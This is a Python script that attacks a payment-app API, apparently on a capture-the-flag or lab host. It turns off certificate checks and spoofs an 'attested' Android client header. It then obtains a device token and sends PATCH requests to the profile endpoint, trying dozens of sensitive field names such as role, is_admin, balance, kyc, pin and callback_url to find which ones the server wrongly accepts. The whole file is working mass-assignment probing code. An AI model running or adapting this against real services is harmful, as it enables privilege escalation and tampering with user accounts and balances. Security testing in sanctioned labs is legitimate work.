import json, ssl, urllib.request, urllib.error, sys, threading, queue, itertools

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CLIENT = "MeridianPay-Android/3.2.1 (attested)"

def raw(path, method="GET", body=None, token=None, client=CLIENT, hdrs=None):
    h = {"Content-Type": "application/json"}
    if client: h["X-Meridian-Client"] = client
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE+path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=8) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"and-enum"})
TOKEN = json.loads(t)["token"]

CAND = """name display_name email role tier is_admin admin plan balance account_id account user_id sub
promo enrolled loyalty points phone address country kyc verified status state device_id attestation
attested client client_type app_version version secret flag key token session_token signature
note notes notes_private private_note memo internal internal_id owner owner_id corporate
master_key master_key_rotation rotation ledger_id iban bic swift card_number cvv pin pin_code
mfa totp otp_enabled two_factor trusted trusted_device jailroot rooted emulator
created_at updated_at dob date_of_birth ssn national_id tax_id
server server_url base_url callback_url webhook redirect_uri next url target
receipt receipt_path path file filename filepath download_url
admin_note staff_note risk_score score override debug dry_run
""".split()

accepted, rejected = [], []
for f in CAND:
    c, b = raw("/api/v1/profile","PATCH",{f:"ZZTEST"}, TOKEN)
    try:
        upd = json.loads(b).get("updated", [])
    except Exception:
        upd = ["ERR:"+str(b)[:60]]
    if f in upd: accepted.append(f)
    else: rejected.append((f, b[:120]))
print("ACCEPTED:", accepted)
print("\nREJECTED sample:")
for f,b in rejected[:10]: print(" ", f, b)
json.dump(accepted, open("profile_fields.json","w"))
